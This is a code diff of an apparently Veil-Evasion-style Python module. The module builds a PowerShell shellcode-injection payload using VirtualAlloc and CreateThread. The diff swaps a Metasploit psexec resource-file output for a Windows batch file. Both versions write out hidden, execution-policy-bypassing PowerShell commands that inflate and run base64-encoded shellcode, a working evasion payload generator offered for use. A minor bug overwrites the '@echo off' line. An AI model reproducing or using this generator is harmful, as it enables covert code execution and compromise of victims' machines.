@@ -1,30 +1,29 @@
 """
 
 Powershell method to inject inline shellcode.
-Builds a metasploit .rc resource file to psexec the powershell command easily
 
 Original concept from Matthew Graeber: http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
 
 Note: the architecture independent invoker was developed independently from 
 	https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/
-	
-Port to the msf resource file by @the_grayhound
+
+
+Module built by @the_grayhound
 
 """
 
 from modules.common import shellcode
 from modules.common import helpers
 
-class Stager:
+class Payload:
 	
 	def __init__(self):
 		# required
-		self.shortname = "PsexecVirtualAlloc"
-		self.description = "PowerShell VirtualAlloc method for inline shellcode injection that makes a Metasploit psexec_command .rc script"
+		self.description = "PowerShell VirtualAlloc method for inline shellcode injection"
 		self.rating = "Excellent"
 		self.language = "powershell"
-		self.extension = "rc"
-		
+		self.extension = "bat"
+
 		self.shellcode = shellcode.Shellcode()
 		
 	def psRaw(self):
@@ -48,12 +47,10 @@ $z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 
 		encoded = helpers.deflate(self.psRaw())
 		
-		rcScript = "use auxiliary/admin/smb/psexec_command\n"
-		rcScript += "set COMMAND "
-		rcScript += "if %PROCESSOR_ARCHITECTURE%==x86 ("
-		rcScript += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\"" % (encoded)
-		rcScript += ") else ("
-		rcScript += "%%WinDir%%\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\")" % (encoded)
-		
-		return rcScript
-		
+		payloadCode = "@echo off\n"
+		payloadCode = "if %PROCESSOR_ARCHITECTURE%==x86 ("
+		payloadCode += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
+		payloadCode += ") else ("
+		payloadCode += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)
+
+		return payloadCode
